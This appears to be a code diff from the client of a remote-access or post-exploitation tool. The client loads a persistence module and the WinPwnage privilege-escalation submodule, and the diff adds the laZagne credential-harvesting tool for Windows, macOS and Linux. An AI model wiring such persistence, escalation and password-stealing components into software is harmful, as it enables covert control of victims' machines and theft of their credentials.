@@ -24,11 +24,16 @@ if platforms.OS in [platforms.DARWIN, platforms.LINUX]:
 elif platforms.OS == platforms.WINDOWS:
     from src.client.persistence.windows import Windows as Persistence
 
-    # import all submodules
     helper.init_submodule("WinPwnage")
+    helper.init_submodule("laZagne/Windows")
 else:
     print("Platform not supported")
     sys.exit(0)
+
+if platforms.OS == platforms.DARWIN:
+    helper.init_submodule("laZagne/Mac")
+elif platforms.OS == platforms.LINUX:
+    helper.init_submodule("laZagne/Linux")
 
 from src.client.client import Client
 from src import logger
